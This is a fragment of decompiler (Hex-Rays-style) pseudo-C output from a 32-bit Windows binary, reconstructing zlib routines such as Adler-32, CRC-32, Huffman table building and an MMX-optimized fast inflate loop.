	if (a3 >= 0x10)
	{
		if (a3 >= 0x15B0)
		{
			v75 = a3 / 0x15B0;
			do
			{
				v8 = 347;
				v76 = v3 - 5552;
				v9 = a2;
				do
				{
					v10 = *v9 + v5;
					v11 = v9[15];
					v12 = v10 + v6;
					v13 = v9[1] + v10;
					v14 = v13 + v12;
					v15 = v9[2] + v13;
					v16 = v15 + v14;
					v17 = v9[3] + v15;
					v18 = v17 + v16;
					v19 = v9[4] + v17;
					v20 = v19 + v18;
					v21 = v9[5] + v19;
					v22 = v21 + v20;
					v23 = v9[6] + v21;
					v24 = v23 + v22;
					v25 = v9[7] + v23;
					v26 = v25 + v24;
					v27 = v9[8] + v25;
					v28 = v27 + v26;
					v29 = v9[9] + v27;
					v30 = v29 + v28;
					v31 = v9[10] + v29;
					v32 = v31 + v30;
					v33 = v9[11] + v31;
					v34 = v33 + v32;
					v35 = v9[12] + v33;
					v36 = v35 + v34;
					v37 = v9[13] + v35;
					v38 = v9[14];
					v39 = v37 + v36;
					v9 += 16;
					v40 = v38 + v37;
					v41 = v40 + v39;
					v5 = v11 + v40;
					v6 = v5 + v41;
					--v8;
				} while (v8);
				a2 = v9;
				v3 = v76;
				v5 %= 0xFFF1u;
				v42 = v75-- == 1;
				v6 %= 0xFFF1u;
			} while (!v42);
			v7 = a2;
		}
		if (v3)
		{
			if (v3 >= 0x10)
			{
				v43 = v3 >> 4;
				do
				{
					v3 -= 16;
					v44 = *v7 + v5;
					v45 = v44 + v6;
					v46 = v7[1] + v44;
					v47 = v46 + v45;
					v48 = v7[2] + v46;
					v49 = v48 + v47;
					v50 = v7[3] + v48;
					v51 = v50 + v49;
					v52 = v7[4] + v50;
					v53 = v52 + v51;
					v54 = v7[5] + v52;
					v55 = v54 + v53;
					v56 = v7[6] + v54;
					v57 = v56 + v55;
					v58 = v7[7] + v56;
					v59 = v58 + v57;
					v60 = v7[8] + v58;
					v61 = v60 + v59;
					v62 = v7[9] + v60;
					v63 = v62 + v61;
					v64 = v7[10] + v62;
					v65 = v64 + v63;
					v66 = v7[11] + v64;
					v67 = v66 + v65;
					v68 = v7[12] + v66;
					v69 = v68 + v67;
					v70 = v7[13] + v68;
					v71 = v70 + v69;
					v72 = v7[14] + v70;
					v73 = v7[15];
					v74 = v72 + v71;
					v7 += 16;
					v5 = v73 + v72;
					v6 = v5 + v74;
					--v43;
				} while (v43);
			}
			for (; v3; --v3)
			{
				v5 += *v7++;
				v6 += v5;
			}
			v5 %= 0xFFF1u;
			v6 %= 0xFFF1u;
		}
		return v5 | (v6 << 16);
	}
	if (a3)
	{
		do
		{
			v5 += *v7++;
			v6 += v5;
			--v3;
		} while (v3);
	}
	if (v5 >= 0xFFF1)
		v5 -= 65521;
	return v5 | (v6 % 0xFFF1 << 16);
}

//----- (681FBF51) --------------------------------------------------------
int __stdcall sub_681FBF51(int a1, int a2, int a3)
{
	int result; // eax

	if (a2)
		result = sub_681FBF73(a1, a2, a3);
	else
		result = 0;
	return result;
}

//----- (681FBF73) --------------------------------------------------------
int __cdecl sub_681FBF73(int a1, _BYTE *a2, unsigned int a3)
{
	_BYTE *v3; // ecx
	unsigned int v4; // edi
	unsigned int v5; // ebx
	bool i; // zf
	unsigned int v7; // edx
	unsigned int v8; // ebx
	unsigned int v9; // edx
	unsigned int v10; // ebx
	unsigned int v11; // edx
	unsigned int v12; // ebx
	unsigned int v13; // edx
	_DWORD *v14; // esi
	unsigned int v15; // edx
	unsigned int v16; // ebx
	unsigned int v18; // [esp+14h] [ebp+8h]

	v3 = a2;
	v4 = a3;
	v5 = ~a1;
	for (i = a3 == 0; !i && v3 & 3; i = v4 == 0)
	{
		v5 = byte_681FDD60[(v5 ^ *v3++) & 0xFF] ^ (v5 >> 8);
		--v4;
	}
	if (v4 < 0x20)
	{
		v14 = v3;
	}
	else
	{
		v18 = v4 >> 5;
		while (1)
		{
			v7 = *(v3 + 1) ^ *&byte_681FE960[4 * (*v3 ^ v5)] ^ byte_681FDD60[(*v3 ^ v5) >> 24] ^ *&byte_681FE560[4 * (((*v3 ^ v5) >> 8) & 0xFF)] ^ byte_681FE160[((*v3 ^ v5) >> 16) & 0xFF];
			v8 = *(v3 + 2) ^ *&byte_681FE960[4 * v7] ^ byte_681FDD60[v7 >> 24] ^ *&byte_681FE560[4 * (v7 >> 8)] ^ byte_681FE160[(v7 >> 16) & 0xFF];
			v9 = *(v3 + 3) ^ *&byte_681FE960[4 * v8] ^ byte_681FDD60[v8 >> 24] ^ *&byte_681FE560[4 * (v8 >> 8)] ^ byte_681FE160[(v8 >> 16) & 0xFF];
			v10 = *(v3 + 4) ^ *&byte_681FE960[4 * v9] ^ byte_681FDD60[v9 >> 24] ^ *&byte_681FE560[4 * (v9 >> 8)] ^ byte_681FE160[(v9 >> 16) & 0xFF];
			v11 = *(v3 + 5) ^ *&byte_681FE960[4 * v10] ^ byte_681FDD60[v10 >> 24] ^ *&byte_681FE560[4 * (v10 >> 8)] ^ byte_681FE160[(v10 >> 16) & 0xFF];
			v4 -= 32;
			v12 = *(v3 + 6) ^ *&byte_681FE960[4 * v11] ^ byte_681FDD60[v11 >> 24] ^ *&byte_681FE560[4 * (v11 >> 8)] ^ byte_681FE160[(v11 >> 16) & 0xFF];
			v13 = *(v3 + 7) ^ *&byte_681FE960[4 * v12] ^ byte_681FDD60[v12 >> 24] ^ *&byte_681FE560[4 * (v12 >> 8)] ^ byte_681FE160[(v12 >> 16) & 0xFF];
			v14 = v3 + 32;
			v5 = *&byte_681FE960[4 * v13] ^ byte_681FDD60[v13 >> 24] ^ *&byte_681FE560[4 * (v13 >> 8)] ^ byte_681FE160[(v13 >> 16) & 0xFF];
			if (!--v18)
				break;
			v3 += 32;
		}
	}
	if (v4 >= 4)
	{
		v15 = v4 >> 2;
		do
		{
			v16 = *v14 ^ v5;
			v4 -= 4;
			++v14;
			v5 = *&byte_681FE960[4 * v16] ^ byte_681FDD60[v16 >> 24] ^ *&byte_681FE560[4 * (v16 >> 8)] ^ byte_681FE160[(v16 >> 16) & 0xFF];
			--v15;
		} while (v15);
	}
	for (; v4; --v4)
	{
		v5 = byte_681FDD60[(v5 ^ *v14)] ^ (v5 >> 8);
		v14 = (v14 + 1);
	}
	return ~v5;
}

//----- (681FC223) --------------------------------------------------------
void *__cdecl ReturnMultipliedMalloc(int Unused, int X, int Y)
{
	return malloc(Y * X);
}

//----- (681FC236) --------------------------------------------------------
void __cdecl FreeMemPtr(int unused, void *Memory)
{
	free(Memory);
}

//----- (681FC244) --------------------------------------------------------
signed int __cdecl sub_681FC244(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, _WORD *a6)
{
	unsigned int i; // ecx
	unsigned int v7; // esi
	unsigned int v8; // ebx
	_DWORD **v9; // edx
	unsigned int v11; // edx
	int v12; // ecx
	unsigned int v13; // edi
	unsigned int v14; // ecx
	unsigned int v15; // ecx
	int v16; // eax
	__int16 *v17; // eax
	unsigned int v18; // edi
	unsigned int v19; // eax
	__int16 v20; // ax
	int v21; // ecx
	int v22; // ecx
	_DWORD *v23; // edi
	unsigned int j; // edi
	unsigned __int16 *v25; // eax
	bool v26; // zf
	int v27; // eax
	int v28; // eax
	char v29; // cl
	signed int v30; // edi
	unsigned int v31; // ebx
	__int16 *v32; // edx
	int v33; // edi
	unsigned int v34; // eax
	int v35; // edi
	__int16 v36; // [esp+Ch] [ebp-7Ch]
	__int16 v37[15]; // [esp+Eh] [ebp-7Ah]
	__int16 v38[16]; // [esp+2Ch] [ebp-5Ch]
	unsigned int v39; // [esp+4Ch] [ebp-3Ch]
	unsigned int v40; // [esp+50h] [ebp-38h]
	int v41; // [esp+54h] [ebp-34h]
	int v42; // [esp+58h] [ebp-30h]
	int v43; // [esp+5Ch] [ebp-2Ch]
	int v44; // [esp+60h] [ebp-28h]
	int v45; // [esp+64h] [ebp-24h]
	int v46; // [esp+68h] [ebp-20h]
	__int16 *v47; // [esp+6Ch] [ebp-1Ch]
	__int16 *v48; // [esp+70h] [ebp-18h]
	unsigned int v49; // [esp+74h] [ebp-14h]
	int v50; // [esp+78h] [ebp-10h]
	int v51; // [esp+7Ch] [ebp-Ch]
	_DWORD *v52; // [esp+80h] [ebp-8h]
	int v53; // [esp+84h] [ebp-4h]
	int v54; // [esp+98h] [ebp+10h]
	unsigned __int16 v55; // [esp+98h] [ebp+10h]

	memset(v38, 0, sizeof(v38));
	for (i = 0; i < a3; ++i)
		++v38[*(a2 + 2 * i)];
	v7 = 15;
	v8 = *a5;
	do
	{
		if (v38[v7])
			break;
		--v7;
	} while (v7 >= 1);
	if (v8 > v7)
		v8 = v7;
	if (!v7)
	{
		v9 = a4;
		**a4 = 320;
		++*v9;
		**a4 = 320;
		++*v9;
		*a5 = 1;
		return 0;
	}
	v11 = 1;
	v50 = 1;
	if (v7 > 1)
	{
		do
		{
			if (v38[v11])
				break;
			++v11;
		} while (v11 < v7);
		v50 = v11;
	}
	v12 = 1;
	v13 = 1;
	if (v8 < v11)
		v8 = v11;
	v39 = v8;
	do
	{
		v12 = 2 * v12 - v38[v13];
		if (v12 < 0)
			return -1;
		++v13;
	} while (v13 <= 0xF);
	if (v12 > 0 && (!a1 || v7 != 1))
		return -1;
	v37[0] = 0;
	v14 = 1;
	do
	{
		v37[v14] = v38[v14] + *(&v36 + v14 * 2);
		++v14;
	} while (v14 < 15);
	v15 = 0;
	if (a3)
	{
		do
		{
			v16 = *(a2 + 2 * v15);
			if (v16)
			{
				a6[*(&v36 + v16)] = v15;
				++*(&v36 + *(a2 + 2 * v15));
			}
			++v15;
		} while (v15 < a3);
		v11 = v50;
	}
	v43 = -1;
	if (a1)
	{
		if (a1 != 1)
		{
			v47 = Inflate_dbase;
			v48 = Inflate_dext;
			v51 = -1;
			goto LABEL_36;
		}
		v51 = 256;
		v47 = &Inflate_lbase[-257];
		v17 = &Inflate_lext[-257];
	}
	else
	{
		v17 = a6;
		v47 = a6;
		v51 = 19;
	}
	v48 = v17;
LABEL_36:
	v18 = 0;
	v53 = 0;
	v49 = 0;
	v52 = *a4;
	v19 = 1 << v8;
	v46 = 1 << v8;
	v45 = 1 << v8;
	v41 = (1 << v8) - 1;
	if (a1 == 1 && v19 > 0x354 || a1 == 2 && v19 > 0x250)
		return 1;
	while (1)
	{
		BYTE1(v54) = v11 - v53;
		v20 = *a6;
		v21 = *a6;
		if (v21 >= v51)
		{
			if (v21 <= v51)
			{
				LOBYTE(v54) = 96;
				v20 = 0;
			}
			else
			{
				LOBYTE(v54) = v48[v21];
				v20 = v47[v21];
			}
		}
		else
		{
			LOBYTE(v54) = 0;
		}
		HIWORD(v54) = v20;
		v44 = 1 << (v11 - v53);
		v40 = v46;
		v42 = 4 * (1 << (v11 - v53));
		v22 = v46;
		v23 = &v52[v46 + (v18 >> v53)];
		do
		{
			v23 = (v23 - v42);
			*v23 = v54;
			v22 -= v44;
		} while (v22);
		for (j = 1 << (v11 - 1); j & v49; j >>= 1)
			;
		if (j)
		{
			v18 = (v49 & (j - 1)) + j;
			v49 = v18;
		}
		else
		{
			v18 = 0;
			v49 = 0;
		}
		v25 = a6 + 1;
		v26 = v38[v11]-- == 1;
		++a6;
		if (!v26)
			goto LABEL_57;
		if (v11 == v7)
			break;
		v27 = *v25;
		v11 = *(a2 + 2 * v27);
		v50 = *(a2 + 2 * v27);
	LABEL_57:
		if (v11 > v8)
		{
			v42 = v18 & v41;
			if ((v18 & v41) != v43)
			{
				v28 = v53;
				if (!v53)
					v28 = v8;
				v53 = v28;
				v52 += v40;
				v29 = v11 - v28;
				v30 = 1 << (v11 - v28);
				v40 = v11;
				if (v11 < v7)
				{
					v31 = v11;
					v32 = &v38[v11];
					do
					{
						v33 = v30 - *v32;
						if (v33 <= 0)
							break;
						++v29;
						++v32;
						++v31;
						v30 = 2 * v33;
					} while (v31 < v7);
					v11 = v50;
					v8 = v39;
				}
				v34 = (1 << v29) + v45;
				v46 = 1 << v29;
				v45 += 1 << v29;
				if (a1 == 1 && v34 > 0x354 || a1 == 2 && v34 > 0x250)
					return 1;
				v35 = v42;
				v43 = v42;
				LOBYTE((*a4)[v42]) = v29;
				BYTE1((*a4)[v35]) = v8;
				HIWORD((*a4)[v35]) = v52 - *a4;
				v18 = v49;
			}
		}
	}
	if (v18)
	{
		LOBYTE(v55) = 64;
		HIBYTE(v55) = v11 - v53;
		v52[v18] = v55;
	}
	*a4 += v45;
	*a5 = v8;
	return 0;
}
// 681FFE38: using guessed type __int16 Inflate_lbase[32];
// 681FFE78: using guessed type __int16 Inflate_lext[31];
// 681FFEB8: using guessed type __int16 Inflate_dbase[32];
// 681FFEF8: using guessed type __int16 Inflate_dext[32];
// 681FC244: using guessed type __int16 var_5C[16];
// 681FC244: using guessed type __int16 var_7A[15];

//----- (681FC6D0) --------------------------------------------------------
int  sub_681FC6D0(__m64 a1, __m64 a2, int a3, int a4)
{
	unsigned int v4; // et0
	_DWORD *v5; // edi
	int v6; // edx
	int v7; // ecx
	int v8; // eax
	unsigned int v9; // ecx
	char *v10; // edx
	unsigned int v11; // ebp
	unsigned int v12; // ebx
	unsigned int *v13; // esi
	char *v14; // ecx
	unsigned int v15; // ecx
	int v16; // eax
	char *v17; // edi
	unsigned int v18; // et0
	unsigned int v19; // eax
	unsigned int v20; // et0
	unsigned __int16 v31; // ax
	char v32; // cl
	unsigned int i; // eax
	unsigned int v34; // edx
	unsigned __int8 v35; // cl
	unsigned __int8 v36; // ch
	unsigned __int16 v37; // ax
	char v38; // cl
	int v39; // eax
	unsigned __int16 v40; // ax
	char v41; // cl
	unsigned int j; // eax
	unsigned int v43; // edx
	unsigned __int8 v44; // cl
	unsigned __int8 v45; // ch
	unsigned __int16 v46; // ax
	char v47; // cl
	int v48; // eax
	int v49; // esi
	char v50; // al
	char v51; // dl
	char *v52; // edi
	char *v53; // edi
	char v54; // al
	unsigned int v55; // ecx
	char *v56; // esi
	unsigned int v57; // eax
	unsigned int v58; // ecx
	unsigned int v59; // ecx
	__m64 v60; // mm4
	__m64 v61; // mm3
	__m64 v62; // mm5
	__m64 v63; // mm2
	__m64 v64; // mm7
	__m64 v65; // mm7
	int v66; // eax
	unsigned int v67; // edx
	int v68; // eax
	__m64 v69; // mm7
	__m64 v70; // mm7
	int v71; // eax
	unsigned int k; // eax
	int v73; // eax
	unsigned int v74; // ecx
	char v75; // dl
	char *v76; // esi
	char *v77; // edi
	char *v78; // edi
	char v79; // al
	unsigned int v80; // ecx
	char *v81; // esi
	unsigned int v82; // ecx
	unsigned int v83; // ecx
	const char *v84; // ecx
	signed int v85; // edx
	int result; // eax
	int v87; // edx
	int v88; // esi
	int v89; // ebx
	char *v90; // [esp+4h] [ebp-64h]
	char *v91; // [esp+8h] [ebp-60h]
	unsigned int v92; // [esp+Ch] [ebp-5Ch]
	int v93; // [esp+10h] [ebp-58h]
	unsigned int v94; // [esp+14h] [ebp-54h]
	unsigned int v95; // [esp+18h] [ebp-50h]
	unsigned int v96; // [esp+1Ch] [ebp-4Ch]
	int v97; // [esp+20h] [ebp-48h]
	unsigned int v98; // [esp+24h] [ebp-44h]
	char *v99; // [esp+28h] [ebp-40h]
	unsigned int v100; // [esp+2Ch] [ebp-3Ch]
	char v101[12]; // [esp+30h] [ebp-38h]
	char *v102; // [esp+3Ch] [ebp-2Ch]
	unsigned int *v103; // [esp+40h] [ebp-28h]
	unsigned int v104; // [esp+44h] [ebp-24h]
	unsigned int v105; // [esp+48h] [ebp-20h]
	char *v106; // [esp+4Ch] [ebp-1Ch]
	char *v107; // [esp+50h] [ebp-18h]
	unsigned int v108; // [esp+54h] [ebp-14h]

	v4 = __readeflags();
	v108 = v4;
	v5 = *(a3 + 28);
	v6 = *a3 + *(a3 + 4) - 11;
	v103 = *a3;
	v99 = v6;
	v7 = *(a3 + 16);
	v107 = *(a3 + 12);
	v102 = &v107[v7 - a4];
	v98 = &v107[v7 - 257];
	v96 = v5[19];
	v97 = v5[20];
	v94 = (1 << v5[21]) - 1;
	v95 = (1 << v5[22]) - 1;
	v8 = v5[10];
	v9 = v5[12];
	v10 = v5[13];
	v105 = v5[10];
	v104 = v9;
	v106 = v10;
	v11 = v5[14];
	v12 = v5[15];
	v13 = v103;
	v14 = v99;
	if (v99 > v103)
	{
		while (v13 & 3)
		{
			v16 = *v13;
			v13 = (v13 + 1);
			v14 = v12;
			v12 += 8;
			v8 = v16 << v14;
			v11 |= v8;
		}
	}
	else
	{
		v15 = v99 + 11 - v103;
		qmemcpy(v101, v103, v15);
		v8 = 0;
		memset(&v101[v15], 0, 12 - v15);
		v14 = 0;
		v13 = v101;
		v99 = v101;
	}
	v17 = v107;
	while (dword_68206000 != 2)
	{
		if (dword_68206000 > 2)
		{
			while (1)
			{
				if (v12 <= 0xFu)
				{
					v31 = *v13;
					v13 = (v13 + 2);
					v32 = v12;
					LOBYTE(v12) = v12 + 16;
					v11 |= v31 << v32;
				}
				for (i = *(v96 + 4 * (v11 & v94)); ; i = *(v96 + 4 * (v34 + (v11 & ((1 << i) - 1)))))
				{
					LOBYTE(v12) = v12 - BYTE1(i);
					v11 >>= SBYTE1(i);
					if (!i)
					{
						*v17++ = BYTE2(i);
						goto LABEL_22;
					}
					v34 = i >> 16;
					if (i & 0x10)
						break;
					if (i & 0x40)
						goto LABEL_97;
				}
				v35 = i & 0xF;
				if (i & 0xF)
				{
					if (v12 < v35)
					{
						v36 = i & 0xF;
						v37 = *v13;
						v13 = (v13 + 2);
						v38 = v12;
						LOBYTE(v12) = v12 + 16;
						v11 |= v37 << v38;
						v35 = v36;
					}
					LOBYTE(v12) = v12 - v35;
					v39 = v11 & ((1 << v35) - 1);
					v11 >>= v35;
					v34 += v39;
				}
				v100 = v34;
				if (v12 <= 0xFu)
				{
					v40 = *v13;
					v13 = (v13 + 2);
					v41 = v12;
					LOBYTE(v12) = v12 + 16;
					v11 |= v40 << v41;
				}
				for (j = *(v97 + 4 * (v11 & v95)); ; j = *(v97 + 4 * (v43 + (v11 & ((1 << j) - 1)))))
				{
					v43 = j >> 16;
					LOBYTE(v12) = v12 - BYTE1(j);
					v11 >>= SBYTE1(j);
					if (j & 0x10)
						break;
					if (j & 0x40)
						goto LABEL_96;
				}
				v44 = j & 0xF;
				if (j & 0xF)
					break;
				if (v43 != 1 || v102 == v17)
					goto LABEL_38;
				v53 = v17 - 1;
				v54 = *v53;
				v53[1] = *v53;
				v53[2] = v54;
				v53[3] = v54;
				v53 += 4;
				memset(v53, v54, v100 - 3);
				v17 = &v53[v100 - 3];
			LABEL_22:
				if (v98 <= v17 || v99 <= v13)
					goto LABEL_104;
			}
			if (v12 < v44)
			{
				v45 = j & 0xF;
				v46 = *v13;
				v13 = (v13 + 2);
				v47 = v12;
				LOBYTE(v12) = v12 + 16;
				v11 |= v46 << v47;
				v44 = v45;
			}
			LOBYTE(v12) = v12 - v44;
			v48 = v11 & ((1 << v44) - 1);
			v11 >>= v44;
			v43 += v48;
		LABEL_38:
			v103 = v13;
			if (v17 - v102 < v43)
			{
				if (v105 < v43)
					goto LABEL_100;
				v55 = v43 + v102 - v17;
				if (v104)
				{
					if (v55 <= v104)
					{
						v56 = &v106[v104 - v55];
						v57 = v100;
						if (v100 > v55)
						{
							v57 = v100 - v55;
							qmemcpy(v17, v56, v55);
							v17 += v55;
							v56 = &v17[-v43];
						}
					}
					else
					{
						v56 = &v106[v105 + v104 - v55];
						v58 = v55 - v104;
						v57 = v100;
						if (v100 > v58)
						{
							v57 = v100 - v58;
							qmemcpy(v17, v56, v58);
							v17 += v58;
							v56 = v106;
							v59 = v104;
							if (v57 > v104)
							{
								v57 -= v104;
								qmemcpy(v17, v106, v104);
								v17 += v59;
								v56 = &v17[-v43];
							}
						}
					}
				}
				else
				{
					v56 = &v106[v105 - v55];
					v57 = v100;
					if (v100 > v55)
					{
						v57 = v100 - v55;
						qmemcpy(v17, v56, v55);
						v17 += v55;
						v56 = &v17[-v43];
					}
				}
				qmemcpy(v17, v56, v57);
				v17 += v57;
				v13 = v103;
			}
			else
			{
				v49 = &v17[-v43];
				*v17 = v17[-v43];
				v50 = v17[-v43 + 1];
				v51 = v17[-v43 + 2];
				v17[1] = v50;
				v17[2] = v51;
				v52 = v17 + 3;
				qmemcpy(v52, (v49 + 3), v100 - 3);
				v17 = &v52[v100 - 3];
				v13 = v103;
			}
			goto LABEL_22;
		}
		v93 = v8;
		v92 = v12;
		v91 = v14;
		v90 = v10;
		v18 = __readeflags();
		v19 = v18;
		__writeeflags(v18 ^ 0x200000);
		v20 = __readeflags();
		if (v19 == v20)
			goto LABEL_113;
		_EAX = 0;
		__asm { cpuid }
		if (_EBX != 1970169159)
			goto LABEL_113;
		if (_ECX != 1818588270)
			goto LABEL_113;
		if (_EDX != 1231384169)
			goto LABEL_113;
		_EAX = 1;
		__asm { cpuid }
		if (((_EAX >> 8) & 0xF) != 6)
			goto LABEL_113;
		if (_EDX & 0x800000)
			dword_68206000 = 2;
		else
			LABEL_113:
		dword_68206000 = 3;
		v10 = v90;
		v14 = v91;
		v12 = v92;
		v8 = v93;
	}
	_m_femms();
	a1 = _mm_cvtsi32_si64(v11);
	v11 = v12;
	v60 = _mm_cvtsi32_si64(v94);
	v61 = v60;
	v62 = _mm_cvtsi32_si64(v95);
	v63 = v62;
	a2.m64_u64 = 0i64;
	v12 = v96;
	while (2)
	{
		a1 = _m_psrlq(a1, a2);
		if (v11 <= 0x20)
		{
			v64 = _mm_cvtsi32_si64(*v13);
			++v13;
			v65 = _m_psllqi(v64, v11);
			v11 += 32;
			a1 = _m_por(a1, v65);
		}
		v66 = _mm_cvtsi64_si32(_m_pand(v60, a1));
		v60 = v61;
		for (i = *(v12 + 4 * v66); ; i = *(v12 + 4 * (v67 + (dword_681FC64C[i & 0xF] & _mm_cvtsi64_si32(a1)))))
		{
			a2 = _mm_cvtsi32_si64(BYTE1(i));
			v11 -= BYTE1(i);
			if (!i)
			{
				*v17++ = BYTE2(i);
				goto LABEL_64;
			}
			v67 = i >> 16;
			if (i & 0x10)
				break;
			if (i & 0x40)
			{
			LABEL_97:
				if (i & 0x20)
				{
					v84 = 0;
					v85 = 11;
				}
				else
				{
					v84 = "invalid literal/length code";
					v85 = 26;
				}
				goto LABEL_101;
			}
			a1 = _m_psrlq(a1, a2);
		}
		v68 = i & 0xF;
		if (v68)
		{
			a1 = _m_psrlq(a1, a2);
			a2 = _mm_cvtsi32_si64(v68);
			v11 -= v68;
			v67 += dword_681FC64C[v68] & _mm_cvtsi64_si32(a1);
		}
		a1 = _m_psrlq(a1, a2);
		if (v11 <= 0x20)
		{
			v69 = _mm_cvtsi32_si64(*v13);
			++v13;
			v70 = _m_psllqi(v69, v11);
			v11 += 32;
			a1 = _m_por(a1, v70);
		}
		v71 = _mm_cvtsi64_si32(_m_pand(v62, a1));
		v62 = v63;
		for (k = *(v97 + 4 * v71); ; k = *(v97 + 4 * (v12 + (dword_681FC64C[k & 0xF] & _mm_cvtsi64_si32(a1)))))
		{
			v12 = k >> 16;
			v11 -= BYTE1(k);
			a2 = _mm_cvtsi32_si64(BYTE1(k));
			if (k & 0x10)
				break;
			if (k & 0x40)
			{
			LABEL_96:
				v84 = "invalid distance code";
				v85 = 26;
				goto LABEL_101;
			}
			a1 = _m_psrlq(a1, a2);
		}
		v73 = k & 0xF;
		if (v73)
		{
			a1 = _m_psrlq(a1, a2);
			a2 = _mm_cvtsi32_si64(v73);
			v11 -= v73;
			v12 += dword_681FC64C[v73] & _mm_cvtsi64_si32(a1);
		}
		else if (v12 == 1 && v102 != v17)
		{
			v78 = v17 - 1;
			v79 = *v78;
			v78[1] = *v78;
			v78[2] = v79;
			v78[3] = v79;
			v78 += 4;
			memset(v78, v79, v67 - 3);
			v17 = &v78[v67 - 3];
			v12 = v96;
			goto LABEL_64;
		}
		v103 = v13;
		if (v17 - v102 >= v12)
		{
			v74 = v67 - 3;
			*v17 = v17[-v12];
			v75 = v17[-v12 + 2];
			v76 = &v17[-v12 + 3];
			v17[1] = v17[-v12 + 1];
			v17[2] = v75;
			v77 = v17 + 3;
			qmemcpy(v77, v76, v74);
			v17 = &v77[v74];
			v13 = v103;
			v12 = v96;
			goto LABEL_64;
		}
		if (v105 < v12)
		{
		LABEL_100:
			v13 = v103;
			v84 = "invalid distance too far back";
			v85 = 26;
		LABEL_101:
			if (v84)
				*(a3 + 24) = v84;
			**(a3 + 28) = v85;
			break;
		}
		v80 = v12 + v102 - v17;
		if (v104)
		{
			if (v80 <= v104)
			{
				v81 = &v106[v104 - v80];
				if (v67 > v80)
				{
					v67 -= v80;
					qmemcpy(v17, v81, v80);
					v17 += v80;
					v81 = &v17[-v12];
				}
			}
			else
			{
				v81 = &v106[v105 + v104 - v80];
				v82 = v80 - v104;
				if (v67 > v82)
				{
					v67 -= v82;
					qmemcpy(v17, v81, v82);
					v17 += v82;
					v81 = v106;
					v83 = v104;
					if (v67 > v104)
					{
						v67 -= v104;
						qmemcpy(v17, v106, v104);
						v17 += v83;
						v81 = &v17[-v12];
					}
				}
			}
		}
		else
		{
			v81 = &v106[v105 - v80];
			if (v67 > v80)
			{
				v67 -= v80;
				qmemcpy(v17, v81, v80);
				v17 += v80;
				v81 = &v17[-v12];
			}
		}
		qmemcpy(v17, v81, v67);
		v17 += v67;
		v13 = v103;
		v12 = v96;
	LABEL_64:
		if (v98 > v17 && v99 > v13)
			continue;
		break;
	}
LABEL_104:
	if (dword_68206000 == 2)
		v12 = v11;
	result = a3;
	v87 = *(a3 + 28);
	v88 = v13 - (v12 >> 3);
	v89 = v12 - 8 * (v12 >> 3);
	*(a3 + 12) = v17;
	*(v87 + 60) = v89;
	if (v99 == v101)
	{
		v88 = *a3 + v88 - v101;
		v99 = (*(a3 + 4) - 11 + *a3);
	}
	*a3 = v88;
	if (dword_68206000 == 2)
	{
		v11 = _mm_cvtsi64_si32(_m_psrlq(a1, a2));
		_m_femms();
	}
	*(v87 + 56) = ((1 << v89) - 1) & v11;
	*(a3 + 4) = &v99[-v88 + 11];
	*(a3 + 16) = v98 - v17 + 257;
	__writeeflags(v108);
	return result;
}
// 681FC64C: using guessed type int dword_681FC64C[];
// 68206000: using guessed type int dword_68206000;
// 681FC6D0: using guessed type char var_38[12];

// ALL OK, 170 function(s) have been successfully decompiled
